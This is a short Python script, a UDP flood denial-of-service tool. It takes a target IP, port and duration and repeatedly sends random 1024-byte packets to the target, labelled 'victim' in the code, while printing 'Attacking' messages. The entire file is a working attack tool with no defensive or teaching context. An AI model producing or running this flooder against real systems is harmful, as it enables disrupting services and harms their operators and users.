import time
import socket
import random
import sys

def usage():
    print("Usage: "+sys.argv[0] + "<ip> <port> <seconds>")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0

    while True:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes,(victim,vport))
        sent = sent + 1
        print("Attacking %s sent packages %s at the port %s" %(sent, victim, vport))


def main():
    print(len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
